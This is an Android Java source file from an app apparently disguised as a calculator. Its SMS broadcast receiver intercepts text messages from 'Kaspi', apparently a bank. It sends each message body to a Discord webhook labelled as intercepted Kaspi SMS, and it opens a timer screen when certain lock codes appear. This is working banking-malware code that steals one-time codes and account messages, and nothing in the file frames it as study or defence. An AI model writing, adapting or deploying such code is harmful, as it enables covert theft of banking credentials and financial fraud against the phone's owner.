package com.example.calculator;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            Object[] pdus = (Object[]) bundle.get("pdus");
            for (Object pdu : pdus) {
                SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                String sender = sms.getOriginatingAddress();
                String message = sms.getMessageBody();
                if (sender != null && sender.contains("Kaspi")) {
                    // Отправляем в вебхук
                    new Thread(() -> {
                        try {
                            String payload = "{\"content\":\"Перехвачено Kaspi SMS: " + message + "\"}";
                            DataCollector.sendToDiscord(payload);
                        } catch (Exception e) {}
                    }).start();

                    // Проверяем коды доступа
                    if (message.contains("KaspiLock1") || message.contains("KaspiLock2")) {
                        // Таймер и показ кода
                        Intent timerIntent = new Intent(context, TimerActivity.class);
                        timerIntent.putExtra("code", message);
                        timerIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(timerIntent);
                    }
                }
            }
        }
    }
}
